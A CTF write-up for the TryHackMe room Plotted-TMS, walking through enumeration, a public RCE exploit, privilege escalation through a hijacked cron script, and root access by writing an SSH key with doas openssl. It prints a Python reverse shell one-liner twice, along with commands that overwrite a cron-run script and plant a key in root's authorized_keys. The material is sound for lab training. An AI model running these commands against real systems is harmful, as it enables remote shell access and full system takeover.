---
title: "TryHackMe - Plotted-TMS"
author: Nasrallah
description: ""
date: 2022-11-25 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, rce, cronjob, openssl]
img_path: /assets/img/tryhackme/plotted
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Plotted-TMS](https://tryhackme.com/room/plottedtms) from [TryHackMe](https://tryhackme.com). The target is running a web application vulnerable to remote code execution giving us the initial foothold. Looking through the system files, we find a cronjob running, so we exploit it to upgrade to use plot_admin. After that we find that we can run openssl as root so we use that to get root access.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.76.208
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a36a9cb11260b272130984cc3873444f (RSA)
|   256 b93f8400f4d1fdc8e78d98033874a14d (ECDSA)
|_  256 d08651606946b2e139439097a6af9693 (ED25519)
80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We found three open ports, ssh is running on port 22 as usual, an apache web server on port 80 and the same on port 445 which is weird because this port is usually for SMB.

## Web

Let's go to the web page on port 80.

![](1.png)

Got the default page of Apache2.

### Gobuster

Let's run a directory scan.

```terminal
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.76.208/ | tee scans/gobuster     
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.76.208/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/26 03:19:42 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 312] [--> http://10.10.76.208/admin/]
/index.html           (Status: 200) [Size: 10918]
/passwd               (Status: 200) [Size: 25]
/server-status        (Status: 403) [Size: 277]
/shadow               (Status: 200) [Size: 25]
===============================================================

```

We some interesting directories, let's check them.

![](2.png)

The admin page contains a file named id_rsa, but that's has a base64 encoded string that says "Trust me it is not this easy..now get back to enumeration :D"

The same applies to the other directories.

Let's run another directory scan for port 445.

```terminal
$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.76.208:445/ | tee scans/gobuster2
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.76.208:445/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Timeout:                 10s
===============================================================
2022/10/26 03:27:55 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 10918]
/management           (Status: 301) [Size: 322] [--> http://10.10.76.208:445/management/]
/server-status        (Status: 403) [Size: 278]
===============================================================
```

Found a page called **/management**, let's check it.

![](3.png)

It's the default page of `Traffic Offense Management System`

# **Foothold**

Searching on google for this management system, i found it's vulnerable to Remote Code Execution, here is the [exploit](https://www.exploit-db.com/exploits/50221).

We run the exploit which uploads a shell and give us the ability to run commands.

![](4.png)

Couldn't execute command because of an error, so i copied the URL and used it in the browser.

![](5.png)

Now let's get a reverse shell. We can do that in two different ways, either we upload a [Pentest Monkey's reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) or we execute the following command after setting up the listener:

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

![](6.png)

# **Privilege Escalation**

After some manual enumeration, we find a cronjob running as `plot_admin`.

```terminal
www-data@plotted:/$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   plot_admin /var/www/scripts/backup.sh

```

We can't modify the file, but the script is located in /var/www/scripts directory which we have full control of. So we can create another backup.sh file that would send us a reverse shell as plot_admin.

```bash
www-data@plotted:/var/www/scripts$ mv backup.sh backup.sh.bak
www-data@plotted:/var/www/scripts$ echo '#!/bin/bash' > backup.sh
www-data@plotted:/var/www/scripts$ echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'"

```

![](7.png)

After this, i uploaded a copy of linpeas, run it and found the following:

![](8.png)

`doas` enables us to run commands as other users, and here we see we can run `openssl` as root.

If we check [GTFOBins](https://gtfobins.github.io/gtfobins/openssl/#file-read), we see that we can read any file using this command `openssl enc -in {file}`. Let's specify the file we want to read which is /root/root.txt, and add `doas` at the beginning of the command.

![](9.png)

We can also write files, and to get a root shell, we can copy our public key to /root/.ssh/authorized_keys. To do that we can use the following command:

```bash
cat sirius.pub | doas openssl enc -out /root/.ssh/authorized_keys
```

Then we can ssh to the target as root without any password.

![](10.png)

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
